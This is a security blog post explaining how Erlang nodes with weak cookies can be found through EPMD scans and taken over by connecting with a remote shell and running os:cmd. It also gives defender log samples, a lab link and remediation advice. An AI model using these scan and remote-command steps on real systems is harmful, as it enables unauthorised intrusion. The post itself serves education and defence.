---
title: "And that's the way the Erlang Cookie crumbles... (Erlang RCE)"
date: 2024-06-12 12:05:00 +0000
nick: t0
rank: "@"
nick_color: "#9cbcff"
---

___Current Song: Anaal Nathrakh - Forward!___

# Introduction

Hello friend,
It's been a hot minute since I posted something on my blog and you've probably noticed I've just changed the UI to this new IRC style design, I hope you like it, I feel more at home on this.

Today we're going to look at something that still bothers me despite knowing about this for quite awhile. Before you panic and get your itchy patch finger out, this is NOT a vulnerability, this is a design choice and if you follow a couple of simple steps you can dramatically reduce the likelihood of this being exploited.

Before we get going, although all testing was performed in a lab environment (dockerfile et al can be found at the bottom of the post if you want to play around), please don't use this information to do something stupid and get yourself arrested, I recommend you only put this into practice when scope allows on bug bounties or you come up against it in an authorised pentest ;)

# So what's the problem?
With all that fluff out of the way, for the unaware, Erlang is a programming language built for creating reliable, concurrent and distributed systems. Each running Erlang instance is called a node and nodes can talk to each other over the network, under normal usage they transmit things like values, process identifiers so they can talk with specific processes and function related information. This is all secured with what's called an Erlang cookie which is a essentially a shared password that lets a node authenticate to another node.

How does Erlang nodes find and connect to each other you might ask, it uses a service called EPMD or Erlang Port Mapper which by default runs on TCP 4369. 

Sounds good right? Nothing can go wrong? Not quite, there's where things get bumpy. Firstly the cookie authentication mechanism does not enforce any kind of lock out policy which makes it ripe for bruteforce attacks, secondly Erlang is a very powerful language and it allows with the right code to execute system commands.  You combine these two things together along with a lazy system admin or developer who sets a crappy password and you give attacker's an easy way to pivot around your network if your Erlang nodes are spread out over multiple sites and VLANs. 

# Detection
This sounds bad but surely this is only an issue on internal networks?
Yeah everyone would feel better if I said this is only an issue if an attacker is already on your network, well for anyone who's ever poked around on an internet scanner like Shodan or Fofa it likely comes as no suprise that you can find EPMD online. Check [this link](https://www.shodan.io/search?query=port%3A4369+product%3A%22Erlang+Port+Mapper+Daemon%22) for a preview, but at the time of writing Shodan found 65,000 of these internet facing.

Shodan kindly prints out node names in the output, which is an important piece of information we need to connect to these bad boys, but what do you do if you want to check your own organisation, maybe just for internal instances that are exposed. Well kindly, nmap has your back, you can run the following command to find exposed instances on the default port, replace -p 4369 with -p- if you prefer to scan all ports: 

```bash
nmap -sV -p 4369 --script=epmd-info $IP-RANGE
```
Just make sure to replace your IP range as specified :)

If there are any accessible servies, you will see something like this:
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-22 13:00 +0100
Nmap scan report for 172.17.0.2
Host is up (0.000069s latency).

PORT     STATE SERVICE
4369/tcp open  epmd
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    vuln: 4368
```
We can see that the node is called "vuln" in this example.

# Taking things further
To try to connect to one of these nodes on your network the easiest way is to install erlang on an appropriate device and execute a command like this one:
```bash
erl -name attacker@0.0.0.0 -setcookie $COOKIE$ -remsh $NODE$@$IP
```
Taking care to replace $COOKIE with your erlang cookie, $NODE with the node name from nmap and $IP with the IP of the node you have found. 

Once you connect, all it takes is to execute the "whoami" command is the following simple Erlang code to execute commands:
```
os:cmd("whoami").
```

From a defenders side, failed authentications can be seen on the Erlang node itself as shown below:
```
=ERROR REPORT==== 22-Apr-2026::10:54:52.892279 ===
** Connection attempt from node 't0@0.0.0.0' rejected. Invalid challenge reply. **

=ERROR REPORT==== 22-Apr-2026::10:54:53.096378 ===
** Connection attempt from node 't0@0.0.0.0' rejected. Invalid challenge reply. **

=ERROR REPORT==== 22-Apr-2026::10:54:53.293106 ===
** Connection attempt from node 't0@0.0.0.0' rejected. Invalid challenge reply. **

=ERROR REPORT==== 22-Apr-2026::10:54:53.496906 ===
** Connection attempt from node 't0@0.0.0.0' rejected. Invalid challenge reply. **

=ERROR REPORT==== 22-Apr-2026::10:54:53.699959 ===
** Connection attempt from node 't0@0.0.0.0' rejected. Invalid challenge reply. **

```

# Exploitation Demo
Those of you who know me personally, I'm a sucker for building an exploit and I figured I could use this to pop some RCEs on a bug bounty program, I've created a golang app which runs nmap to get the node and automatically tries passwords from a password list using goroutines to provide threading. Sadly I can't share the code with you (thanks Computer Misuse Act :P) but you can see a demo of what this looks like below. Please note it takes awhile to run as the word list has a few 100 passwords in it:

![Erlang Scanner](/assets/images/erlang-scanner.gif)

# Testing
If you want to play with this in a safe lab, the dockerfile and associated scripts can be found [here](https://github.com/th30ccupi3r/public/tree/main/erlang_rce) if you start it up you should be able to hit on 172.17.0.2.

# Remediation
* DO NOT allow access to the erlang nodes from outside the cluster, you need to make sure your firewall rules are bullet proof for this one.
* DO ensure the Erlang cookie uses a long random value and you DO NOT store it in code repositories where someone can easily find it.
